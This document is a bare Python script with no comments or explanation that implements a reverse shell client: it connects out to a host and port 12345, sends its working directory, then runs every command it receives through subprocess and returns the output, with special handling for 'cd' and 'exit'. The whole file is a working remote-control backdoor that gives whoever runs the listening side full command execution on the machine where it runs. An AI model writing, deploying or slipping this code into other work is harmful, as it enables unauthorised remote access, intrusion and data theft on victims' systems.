import socket
import subprocess
import os
import sys


s = socket.socket()
s.connect((sys.argv[1], 12345))

separator = "<3"

buffer_size = 1024

directory = os.getcwd()
s.send(directory.encode())

while True:
    
    command = s.recv(buffer_size).decode()
    splitted_command = command.split()
    if command.lower() == "exit":
    
        break
    if splitted_command[0].lower() == "cd":
       
        try:
            os.chdir(' '.join(splitted_command[1:]))
        except FileNotFoundError as e:
           
            output = str(e)
        else:
           
            output = ""
    else:
       
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd()
   
    message = f"{output}{separator}{cwd}"
    s.send(message.encode())

s.close()